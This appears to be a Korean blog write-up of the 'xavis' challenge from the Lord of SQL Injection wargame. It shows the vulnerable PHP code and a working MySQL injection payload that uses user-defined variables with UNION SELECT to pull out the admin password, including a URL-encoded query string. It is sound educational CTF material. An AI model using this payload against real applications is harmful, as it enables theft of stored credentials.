---
layout: post
title: MySQL Injection - User variables and Union closure
comments: true
---

좋은 [~~유통기간은 안지난~~ 떡밥](https://www.facebook.com/rubiya.god/posts/728908737290872)이 있어서 정리합니다.
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis");
  highlight_file(__FILE__);
?>
```
아시는 분들은 아시겠지만 위 코드는 [Lord of SQL Injection](http://los.eagle-jump.org/)의 [xavius](http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php)문제입니다.

본래 문제의 의도는 Blind SQL Injection을 통해 키값을 뽑아낸 후 인증을 하라는 식으로 문제가 구성이 되어 있는 것을 볼 수 있습니다.

하지만 정작 이 문제를 만든 장본인이 다른 방법이 있다고 떡밥을 뿌리고 댓글에 답을 적어놨죠...

자 한번 [4.6.5 Using User-Defined Variables](https://dev.mysql.com/doc/refman/5.7/en/example-user-variables.html)를 봐보시면 아래와 같은 예시를 보실 수 있습니다.
```SQL
mysql> SELECT @min_price:=MIN(price),@max_price:=MAX(price) FROM shop;
mysql> SELECT * FROM shop WHERE price=@min_price OR price=@max_price;
+---------+--------+-------+
| article | dealer | price |
+---------+--------+-------+
|    0003 | D      |  1.25 |
|    0004 | D      | 19.95 |
+---------+--------+-------+
```
`min_price`와 `max_price`라는 User defined variables를 이용하는 것을 볼 수 있습니다.

이를 Where closure상에서도 먹히더군요.

```SQL
SELECT foo FROM bar WHERE 1 AND @baz:=foo;
```
이런 식으로 말이죠.

그래서 Union Closure로 저 `@baz`를 담아내면 성공적으로 Injection이 되는 겁니다.

```SQL
SELECT foo FROM bar WHERE 1 AND @baz:=foo UNION SELECT @baz LIMIT 1,1;
```

이와 유사하게 xavius문제에 적용을 한다면...

```SQL
select id from prob_xavis where id='admin' and pw='' OR 1 AND @t:=pw UNION SELECT @t#'
```
`?pw=%27%20OR%201%20AND%20@t:=pw%20UNION%20SELECT%20@t%23`와 같이 쿼리를 실행시켰을 경우 admin의 패스워드를 가져 오게 되겠죠.
